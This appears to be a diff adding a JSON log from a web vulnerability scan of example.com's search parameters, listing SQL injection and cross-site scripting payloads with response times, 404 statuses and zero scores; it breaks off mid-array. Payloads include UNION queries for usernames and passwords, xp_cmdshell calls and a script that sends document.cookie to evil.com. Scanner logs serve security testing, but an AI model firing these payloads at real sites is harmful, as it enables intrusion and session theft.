@@ -1,0 +1,1242 @@
+[
+  {
+    "url": "http://example.com/search?q=%27+OR+1%3D1+%23&page=1",
+    "param": "q",
+    "payload": "' OR 1=1 #",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 719,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+1%3D1+--&page=1",
+    "param": "q",
+    "payload": "' OR 1=1 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 899,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+%271%27%3D%271&page=1",
+    "param": "q",
+    "payload": "' OR '1'='1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 923,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+1%3D1%2F%2A&page=1",
+    "param": "q",
+    "payload": "' OR 1=1/*",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 911,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+%271%27%3D%271%27+--&page=1",
+    "param": "q",
+    "payload": "' OR '1'='1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 924,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=admin%27+--&page=1",
+    "param": "q",
+    "payload": "admin' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 512,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=admin%27+%23&page=1",
+    "param": "q",
+    "payload": "admin' #",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 513,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=admin%27+OR+%271%27%3D%271&page=1",
+    "param": "q",
+    "payload": "admin' OR '1'='1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 509,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=admin%27%2F%2A&page=1",
+    "param": "q",
+    "payload": "admin'/*",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 534,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=admin%27+OR+%271%27%3D%271%27+--&page=1",
+    "param": "q",
+    "payload": "admin' OR '1'='1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 531,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1%27+OR+%271%27%3D%271&page=1",
+    "param": "q",
+    "payload": "1' OR '1'='1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 518,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1%27+OR+%271%27%3D%271%27+--&page=1",
+    "param": "q",
+    "payload": "1' OR '1'='1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 506,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+%27x%27%3D%27x&page=1",
+    "param": "q",
+    "payload": "' OR 'x'='x",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 502,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1+OR+1%3D1+--&page=1",
+    "param": "q",
+    "payload": "1 OR 1=1 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 529,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+%27%27+%3D+%27&page=1",
+    "param": "q",
+    "payload": "' OR '' = '",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 516,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1%27+OR+%271%27%3D%271%27+LIMIT+1+--&page=1",
+    "param": "q",
+    "payload": "1' OR '1'='1' LIMIT 1 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 542,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1+UNION+SELECT+1%2C2%2C3+--&page=1",
+    "param": "q",
+    "payload": "1 UNION SELECT 1,2,3 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 539,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+UNION+SELECT+username%2Cpassword%2Cnull+FROM+users+--&page=1",
+    "param": "q",
+    "payload": "' UNION SELECT username,password,null FROM users --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 514,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+UNION+SELECT+null%2Cnull%2Cnull+--&page=1",
+    "param": "q",
+    "payload": "' UNION SELECT null,null,null --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 526,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1%27+UNION+SELECT+1%2C2%2C3+--&page=1",
+    "param": "q",
+    "payload": "1' UNION SELECT 1,2,3 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 552,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+username+IS+NOT+NULL+--&page=1",
+    "param": "q",
+    "payload": "' OR username IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 555,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+userid+IS+NOT+NULL+--&page=1",
+    "param": "q",
+    "payload": "' OR userid IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 522,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+id+IS+NOT+NULL+--&page=1",
+    "param": "q",
+    "payload": "' OR id IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 505,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+uid+IS+NOT+NULL+--&page=1",
+    "param": "q",
+    "payload": "' OR uid IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 520,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27+OR+user_id+IS+NOT+NULL+--&page=1",
+    "param": "q",
+    "payload": "' OR user_id IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 531,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%22+OR+%221%22%3D%221&page=1",
+    "param": "q",
+    "payload": "\" OR \"1\"=\"1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 540,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%22+OR+%221%22%3D%221%22+--&page=1",
+    "param": "q",
+    "payload": "\" OR \"1\"=\"1\" --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 510,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%22+OR+%22%22%3D%22&page=1",
+    "param": "q",
+    "payload": "\" OR \"\"=\"",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 518,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1%22+OR+%221%22%3D%221&page=1",
+    "param": "q",
+    "payload": "1\" OR \"1\"=\"1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 533,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%22+OR+%22x%22%3D%22x&page=1",
+    "param": "q",
+    "payload": "\" OR \"x\"=\"x",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 545,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=1%22+OR+%221%22%3D%221%22+--&page=1",
+    "param": "q",
+    "payload": "1\" OR \"1\"=\"1\" --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 527,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27%29%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--&page=1",
+    "param": "q",
+    "payload": "'); WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 543,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27+--&page=1",
+    "param": "q",
+    "payload": "';WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 556,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%29%3BWAITFOR+DELAY+%270%3A0%3A5%27+--&page=1",
+    "param": "q",
+    "payload": ");WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 511,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%29%29%3BWAITFOR+DELAY+%270%3A0%3A5%27+--&page=1",
+    "param": "q",
+    "payload": "));WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 539,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27%3BEXEC+master..xp_cmdshell+%27ping+127.0.0.1%27+--&page=1",
+    "param": "q",
+    "payload": "';EXEC master..xp_cmdshell 'ping 127.0.0.1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 543,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "<script>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 535,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 528,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&page=1",
+    "param": "q",
+    "payload": "<img src=x onerror=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 536,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E&page=1",
+    "param": "q",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 569,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Csvg+onload%3Dalert%281%29%3E&page=1",
+    "param": "q",
+    "payload": "<svg onload=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 539,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E&page=1",
+    "param": "q",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 524,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Ciframe+src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E&page=1",
+    "param": "q",
+    "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 520,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Ciframe+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E&page=1",
+    "param": "q",
+    "payload": "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 549,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=javascript%3Aalert%281%29&page=1",
+    "param": "q",
+    "payload": "javascript:alert(1)",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 502,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=javascript%3Aalert%28%27XSS%27%29&page=1",
+    "param": "q",
+    "payload": "javascript:alert('XSS')",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 516,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3EClick+me%3C%2Fa%3E&page=1",
+    "param": "q",
+    "payload": "<a href=\"javascript:alert(1)\">Click me</a>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 510,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Ca+href%3D%22javascript%3Aalert%28%27XSS%27%29%22%3EClick+me%3C%2Fa%3E&page=1",
+    "param": "q",
+    "payload": "<a href=\"javascript:alert('XSS')\">Click me</a>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 502,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cbody+onload%3Dalert%281%29%3E&page=1",
+    "param": "q",
+    "payload": "<body onload=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 530,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E&page=1",
+    "param": "q",
+    "payload": "<body onload=alert('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 505,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cscript%3Eeval%28String.fromCharCode%2897%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41%29%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 516,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cimg+src%3D%22x%22+onerror%3D%22%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%22%3E&page=1",
+    "param": "q",
+    "payload": "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 541,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Csvg%2Fonload%3Dalert%281%29%3E&page=1",
+    "param": "q",
+    "payload": "<svg/onload=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 522,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cscript+src%3D%2F%2Fevil.com%2Fxss.js%3E%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "<script src=//evil.com/xss.js></script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 520,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3CSVG%2FONLOAD%3DALERT%28%27XSS%27%29%3E&page=1",
+    "param": "q",
+    "payload": "<SVG/ONLOAD=ALERT('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 529,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "\"><script>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 505,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "'><script>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 540,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&page=1",
+    "param": "q",
+    "payload": "\"><img src=x onerror=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 541,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%27%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&page=1",
+    "param": "q",
+    "payload": "'><img src=x onerror=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 517,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cscript%3Efetch%28%27https%3A%2F%2Fevil.com%2F%27%2Bdocument.cookie%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "<script>fetch('https://evil.com/'+document.cookie)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 537,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "<scr<script>ipt>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+%271%27%3D%271",
+    "param": "page",
+    "payload": "' OR '1'='1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+%271%27%3D%271%27+--",
+    "param": "page",
+    "payload": "' OR '1'='1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 513,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=%3Cscr%3Cscript%3Eipt%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&page=1",
+    "param": "q",
+    "payload": "<scr<script>ipt>alert('XSS')</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 533,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+1%3D1+--",
+    "param": "page",
+    "payload": "' OR 1=1 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 514,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+1%3D1+%23",
+    "param": "page",
+    "payload": "' OR 1=1 #",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 524,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+1%3D1%2F%2A",
+    "param": "page",
+    "payload": "' OR 1=1/*",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=admin%27+--",
+    "param": "page",
+    "payload": "admin' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=admin%27+%23",
+    "param": "page",
+    "payload": "admin' #",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 549,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=admin%27%2F%2A",
+    "param": "page",
+    "payload": "admin'/*",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 535,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=admin%27+OR+%271%27%3D%271",
+    "param": "page",
+    "payload": "admin' OR '1'='1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 521,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1%27+OR+%271%27%3D%271",
+    "param": "page",
+    "payload": "1' OR '1'='1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 515,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=admin%27+OR+%271%27%3D%271%27+--",
+    "param": "page",
+    "payload": "admin' OR '1'='1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 547,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1+OR+1%3D1+--",
+    "param": "page",
+    "payload": "1 OR 1=1 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 502,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1%27+OR+%271%27%3D%271%27+--",
+    "param": "page",
+    "payload": "1' OR '1'='1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 521,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+%27%27+%3D+%27",
+    "param": "page",
+    "payload": "' OR '' = '",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 537,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+%27x%27%3D%27x",
+    "param": "page",
+    "payload": "' OR 'x'='x",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 520,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1%27+OR+%271%27%3D%271%27+LIMIT+1+--",
+    "param": "page",
+    "payload": "1' OR '1'='1' LIMIT 1 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 503,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1+UNION+SELECT+1%2C2%2C3+--",
+    "param": "page",
+    "payload": "1 UNION SELECT 1,2,3 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 509,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1%27+UNION+SELECT+1%2C2%2C3+--",
+    "param": "page",
+    "payload": "1' UNION SELECT 1,2,3 --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 518,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+UNION+SELECT+null%2Cnull%2Cnull+--",
+    "param": "page",
+    "payload": "' UNION SELECT null,null,null --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 532,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+UNION+SELECT+username%2Cpassword%2Cnull+FROM+users+--",
+    "param": "page",
+    "payload": "' UNION SELECT username,password,null FROM users --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 509,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+username+IS+NOT+NULL+--",
+    "param": "page",
+    "payload": "' OR username IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 512,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+userid+IS+NOT+NULL+--",
+    "param": "page",
+    "payload": "' OR userid IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 537,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+id+IS+NOT+NULL+--",
+    "param": "page",
+    "payload": "' OR id IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 535,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+user_id+IS+NOT+NULL+--",
+    "param": "page",
+    "payload": "' OR user_id IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 521,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27+OR+uid+IS+NOT+NULL+--",
+    "param": "page",
+    "payload": "' OR uid IS NOT NULL --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 503,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%22+OR+%221%22%3D%221",
+    "param": "page",
+    "payload": "\" OR \"1\"=\"1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 509,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%22+OR+%221%22%3D%221%22+--",
+    "param": "page",
+    "payload": "\" OR \"1\"=\"1\" --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 510,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%22+OR+%22%22%3D%22",
+    "param": "page",
+    "payload": "\" OR \"\"=\"",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 559,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%22+OR+%22x%22%3D%22x",
+    "param": "page",
+    "payload": "\" OR \"x\"=\"x",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 524,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1%22+OR+%221%22%3D%221",
+    "param": "page",
+    "payload": "1\" OR \"1\"=\"1",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 528,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=1%22+OR+%221%22%3D%221%22+--",
+    "param": "page",
+    "payload": "1\" OR \"1\"=\"1\" --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 513,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27%29%3B+WAITFOR+DELAY+%270%3A0%3A5%27+--",
+    "param": "page",
+    "payload": "'); WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 516,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27+--",
+    "param": "page",
+    "payload": "';WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%29%29%3BWAITFOR+DELAY+%270%3A0%3A5%27+--",
+    "param": "page",
+    "payload": "));WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 540,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%29%3BWAITFOR+DELAY+%270%3A0%3A5%27+--",
+    "param": "page",
+    "payload": ");WAITFOR DELAY '0:0:5' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 503,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%27%3BEXEC+master..xp_cmdshell+%27ping+127.0.0.1%27+--",
+    "param": "page",
+    "payload": "';EXEC master..xp_cmdshell 'ping 127.0.0.1' --",
+    "category": "sql",
+    "evidence": [],
+    "response_time": 533,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "<script>alert(1)</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 531,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+    "param": "page",
+    "payload": "<script>alert('XSS')</script>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 553,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "param": "page",
+    "payload": "<img src=x onerror=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 506,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E",
+    "param": "page",
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 509,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Csvg+onload%3Dalert%281%29%3E",
+    "param": "page",
+    "payload": "<svg onload=alert(1)>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 512,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E",
+    "param": "page",
+    "payload": "<svg onload=alert('XSS')>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 527,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Ciframe+src%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fiframe%3E",
+    "param": "page",
+    "payload": "<iframe src=\"javascript:alert(1)\"></iframe>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 531,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Ciframe+src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2Fiframe%3E",
+    "param": "page",
+    "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 538,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=javascript%3Aalert%281%29",
+    "param": "page",
+    "payload": "javascript:alert(1)",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 513,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=javascript%3Aalert%28%27XSS%27%29",
+    "param": "page",
+    "payload": "javascript:alert('XSS')",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 503,
+    "status": 404,
+    "score": 0
+  },
+  {
+    "url": "http://example.com/search?q=test&page=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3EClick+me%3C%2Fa%3E",
+    "param": "page",
+    "payload": "<a href=\"javascript:alert(1)\">Click me</a>",
+    "category": "xss",
+    "evidence": [],
+    "response_time": 508,
+    "status": 404,
+    "score": 0
+  },
+  {
